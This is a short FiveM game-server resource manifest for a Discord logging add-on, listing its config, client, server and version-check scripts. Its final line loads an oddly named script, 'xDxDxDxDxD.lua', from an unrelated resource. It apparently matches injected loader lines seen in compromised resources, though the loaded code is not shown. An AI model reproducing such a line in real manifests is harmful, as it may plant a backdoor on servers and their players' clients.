fx_version('bodacious')
game('gta5')

author 'JokeDevil'
description 'FXServer logs to Discord (https://www.jokedevil.com/)'
version '1.1.0'
url 'https://jokedevil.com'

server_script 'config.lua'
client_script 'config.lua'

server_script 'server/server.lua'
server_script 'versioncheck.lua'

client_script 'client/client.lua'

file 'postals.json'
postal_file 'postals.json'
file 'version.json'

client_script '@renameit/xDxDxDxDxD.lua'